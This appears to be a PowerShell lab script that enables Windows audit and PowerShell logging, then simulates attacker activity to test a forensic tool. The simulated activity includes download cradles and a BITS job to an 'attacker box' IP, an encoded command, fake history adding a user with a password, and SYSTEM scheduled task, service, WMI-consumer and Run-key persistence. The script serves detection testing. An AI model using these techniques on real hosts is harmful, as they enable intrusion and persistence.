# Phase A: turn execution telemetry on and generate real activity on a lab host.
# Run through rf-ps.ps1 as Administrator. Everything is logged to C:\RangeForge\caarea-activity.log
# with UTC timestamps so caarea's output can be checked against what really happened.
$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'
New-Item -ItemType Directory -Force 'C:\RangeForge', 'C:\Temp' | Out-Null
$log = 'C:\RangeForge\caarea-activity.log'
function Log($m) { $line = "$((Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ss.fffZ')) $m"; $line; Add-Content -Path $log -Value $line }

Log '=== phase A start ==='

# --- telemetry --------------------------------------------------------------
Log 'prefetch: EnablePrefetcher=3, restart SysMain'
$pf = 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters'
Set-ItemProperty $pf -Name EnablePrefetcher -Value 3 -Type DWord
Set-ItemProperty $pf -Name EnableSuperfetch -Value 3 -Type DWord
Restart-Service SysMain -Force

Log 'audit: process creation/termination with command line, task events'
auditpol /set /subcategory:"Process Creation" /success:enable | Out-Null
auditpol /set /subcategory:"Process Termination" /success:enable | Out-Null
auditpol /set /subcategory:"Other Object Access Events" /success:enable | Out-Null
auditpol /set /subcategory:"Security System Extension" /success:enable | Out-Null
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f | Out-Null

Log 'powershell: module + script block logging'
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging /v EnableModuleLogging /t REG_DWORD /d 1 /f | Out-Null
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging\ModuleNames /v * /t REG_SZ /d * /f | Out-Null
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f | Out-Null

Log 'event channels: TaskScheduler, BITS, AppLocker, Shell-Core'
foreach ($ch in 'Microsoft-Windows-TaskScheduler/Operational', 'Microsoft-Windows-Bits-Client/Operational',
    'Microsoft-Windows-AppLocker/EXE and DLL', 'Microsoft-Windows-AppLocker/MSI and Script', 'Microsoft-Windows-Shell-Core/Operational') {
    wevtutil sl "$ch" /e:true 2>&1 | Out-Null
}

Log 'applocker: audit-only policy (allow *, deny %OSDRIVE%\Temp\*), start AppIDSvc'
$xml = @'
<AppLockerPolicy Version="1">
  <RuleCollection Type="Exe" EnforcementMode="AuditOnly">
    <FilePathRule Id="921cc481-6e17-4653-8f75-050b80acca20" Name="All files" Description="" UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="*"/></Conditions></FilePathRule>
    <FilePathRule Id="a61c8b2c-a319-4cd0-9690-d2177cad7b51" Name="Deny Temp" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%OSDRIVE%\Temp\*"/></Conditions></FilePathRule>
  </RuleCollection>
  <RuleCollection Type="Script" EnforcementMode="AuditOnly">
    <FilePathRule Id="06dce67b-934c-454f-a263-2515c8796a5d" Name="All scripts" Description="" UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="*"/></Conditions></FilePathRule>
  </RuleCollection>
</AppLockerPolicy>
'@
Set-Content -Path C:\RangeForge\applocker.xml -Value $xml -Encoding UTF8
sc.exe config appidsvc start= auto | Out-Null
Start-Service AppIDSvc
Set-AppLockerPolicy -XmlPolicy C:\RangeForge\applocker.xml
Start-Sleep -Seconds 3

# --- activity ---------------------------------------------------------------
Log 'run builtins: whoami, ipconfig, net, tasklist, certutil, nslookup, reg, wmic'
whoami /all | Out-Null
ipconfig /all | Out-Null
net user | Out-Null
net localgroup administrators | Out-Null
tasklist /v | Out-Null
certutil -hashfile C:\Windows\System32\cmd.exe SHA256 | Out-Null
nslookup dev-dc01 2>&1 | Out-Null
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run | Out-Null
wmic process get name,processid 2>&1 | Out-Null
cmd.exe /c "echo caarea > C:\Temp\echo.txt"

Log 'drop and run a renamed binary from C:\Temp (prefetch + 4688 + AppLocker audit)'
Copy-Item C:\Windows\System32\whoami.exe C:\Temp\caarea-test.exe -Force
& C:\Temp\caarea-test.exe /user | Out-Null
Start-Sleep -Seconds 2
& C:\Temp\caarea-test.exe /groups | Out-Null

Log 'powershell: encoded command, download cradle attempt, history lines'
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Get-Process | Select-Object -First 3 | Out-Null; Write-Output caarea-encoded'))
powershell.exe -NoProfile -EncodedCommand $enc | Out-Null
powershell.exe -NoProfile -Command "try { Invoke-WebRequest -Uri http://10.10.0.25/caarea.ps1 -TimeoutSec 5 -UseBasicParsing | Out-Null } catch { 'cradle failed as expected' }" | Out-Null
$hist = Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
New-Item -ItemType Directory -Force (Split-Path $hist) | Out-Null
Add-Content -Path $hist -Value @('whoami /all', 'Get-LocalUser', 'net user caarea P@ssw0rd /add', 'Invoke-WebRequest http://10.10.0.25/caarea.ps1 -OutFile C:\Temp\c.ps1', 'C:\Temp\caarea-test.exe /user')

Log 'scheduled task: create, run, disable, enable, update (4698/4700/4701/4702 + TaskScheduler 106/100/200/201/102)'
schtasks /create /tn "CaareaLabTask" /tr "cmd.exe /c echo task > C:\Temp\task.txt" /sc once /st 23:59 /ru SYSTEM /f | Out-Null
schtasks /run /tn "CaareaLabTask" | Out-Null
Start-Sleep -Seconds 5
schtasks /change /tn "CaareaLabTask" /disable | Out-Null
schtasks /change /tn "CaareaLabTask" /enable | Out-Null
schtasks /change /tn "CaareaLabTask" /tr "cmd.exe /c echo task2 > C:\Temp\task2.txt" | Out-Null
schtasks /run /tn "CaareaLabTask" | Out-Null
Start-Sleep -Seconds 5

Log 'service: create and start (7045 + 4697), it will fail to start on purpose'
sc.exe create CaareaSvc binPath= "C:\Windows\System32\cmd.exe /c ping -n 3 127.0.0.1" start= demand DisplayName= "Caarea Lab Service" | Out-Null
sc.exe start CaareaSvc 2>&1 | Out-Null
Start-Sleep -Seconds 3

Log 'wmi: query (5857/5858), temporary consumer (5860), permanent consumer (5861)'
Get-WmiObject Win32_Process -Filter "Name='lsass.exe'" | Out-Null
Register-WmiEvent -Query "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process'" -SourceIdentifier caareaTemp
Start-Sleep -Seconds 6
Unregister-Event -SourceIdentifier caareaTemp -ErrorAction SilentlyContinue
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='CaareaFilter'; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='CaareaConsumer'; CommandLineTemplate='cmd.exe /c echo wmi >> C:\Temp\wmi.txt'}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer} | Out-Null
Start-Sleep -Seconds 5

Log 'run key for Administrator (registry:run)'
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v CaareaRun /t REG_SZ /d "cmd.exe /c echo run > C:\Temp\run.txt" /f | Out-Null

Log 'bits: asynchronous job to the attacker box (3/59/60), cancelled after 10 s'
try {
    $job = Start-BitsTransfer -Source 'http://10.10.0.25/caarea.bin' -Destination 'C:\Temp\bits.bin' -Asynchronous -DisplayName CaareaBits -ErrorAction Stop
    Start-Sleep -Seconds 10
    Remove-BitsTransfer -BitsJob $job -ErrorAction SilentlyContinue
} catch { Log "bits: $_" }

Log 'defender: EICAR test file (1116/1117 + MPLog)'
$eicar = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$' + 'EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
try { Set-Content -Path C:\Temp\eicar.com -Value $eicar -Encoding ASCII -ErrorAction Stop } catch { Log "defender blocked the write: $_" }
Start-Sleep -Seconds 10

Log 'crash: powershell FailFast (Application Error 1000, WER 1001, Report.wer)'
Start-Process -FilePath powershell.exe -ArgumentList '-NoProfile', '-Command', "[Environment]::FailFast('caarea lab crash')" -Wait -WindowStyle Hidden
Start-Sleep -Seconds 15

Log 'export logs and list artifacts'
New-Item -ItemType Directory -Force C:\RangeForge\export\logs | Out-Null
foreach ($ch in 'Security', 'System', 'Application', 'Windows PowerShell', 'Microsoft-Windows-PowerShell/Operational',
    'Microsoft-Windows-TaskScheduler/Operational', 'Microsoft-Windows-WMI-Activity/Operational', 'Microsoft-Windows-Bits-Client/Operational',
    'Microsoft-Windows-AppLocker/EXE and DLL', 'Microsoft-Windows-AppLocker/MSI and Script', 'Microsoft-Windows-Windows Defender/Operational',
    'Microsoft-Windows-Shell-Core/Operational') {
    $name = ($ch -replace '/', '%4') + '.evtx'
    Remove-Item "C:\RangeForge\export\logs\$name" -ErrorAction SilentlyContinue
    wevtutil epl "$ch" "C:\RangeForge\export\logs\$name" 2>&1 | Out-Null
}
Get-ChildItem C:\Windows\Prefetch -Filter *.pf | Measure-Object | ForEach-Object { Log "prefetch files: $($_.Count)" }
Get-ChildItem C:\Windows\Prefetch -Filter CAAREA* | ForEach-Object { Log "prefetch: $($_.Name) $($_.Length)" }
Get-ChildItem 'C:\ProgramData\Microsoft\Windows\WER\ReportArchive', 'C:\ProgramData\Microsoft\Windows\WER\ReportQueue' -Recurse -Filter Report.wer -ErrorAction SilentlyContinue | ForEach-Object { Log "wer: $($_.FullName)" }
Get-ChildItem 'C:\ProgramData\Microsoft\Windows Defender\Support' -Filter MPLog* -ErrorAction SilentlyContinue | ForEach-Object { Log "mplog: $($_.Name) $($_.Length)" }
Log "psreadline: $hist $((Get-Content $hist).Count) lines"
Log '=== phase A done ==='
